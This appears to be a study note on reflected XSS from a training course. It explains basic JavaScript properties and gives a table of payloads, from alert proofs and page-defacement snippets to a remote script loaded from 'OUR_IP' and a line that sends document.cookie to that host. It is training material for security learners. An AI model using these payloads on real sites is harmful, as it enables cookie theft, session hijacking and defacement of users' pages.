
## Reflected XSS Attacks

- `origin` is read only property.
- Returns the protocol, hostname/IP address and port number of the URL in a string format.
- The `alert` will display the information in a box of the webpage.

```html
<script>alert(window.origin)</script>
```


### Other XSS Payloads

- `alert(<message>)` --> a string you want to display in the alert dialog, or, alternatively, an object that is converted into a string and displayed.
	 
- `<plaintext>` --> will stop rendering the HTML code that comes after it and display it as plaintext. (**DEPRECATED**) but may still support in many web browsers.
	 
- `window.print()` --> opens the web browser's print dialog box that allows the user to print the current webpage content.
	
- `document.cookie` --> can be used to read, write, or delete cookies.
	- **READ COOKIE** 

```html
<script>alert(document.cookie)</script>
```

### XSS Payloads

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md

https://github.com/payloadbox/xss-payload-list

Below are some demos....

|Code|Description|
|---|---|
|**XSS Payloads**||
|`<script>alert(window.origin)</script>`|Basic XSS Payload|
|`<plaintext>`|Basic XSS Payload|
|`<script>print()</script>`|Basic XSS Payload|
|`<img src="" onerror=alert(window.origin)>`|HTML-based XSS Payload|
|`<script>document.body.style.background = "#141d2b"</script>`|Change Background Color|
|`<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>`|Change Background Image|
|`<script>document.title = 'HackTheBox Academy'</script>`|Change Website Title|
|`<script>document.getElementsByTagName('body')[0].innerHTML = 'text'</script>`|Overwrite website's main body|
|`<script>document.getElementById('urlform').remove();</script>`|Remove certain HTML element|
|`<script src="http://OUR_IP/script.js"></script>`|Load remote script|
|`<script>new Image().src='http://OUR_IP/index.php?c='+document.cookie</script>`|Send Cookie details to us|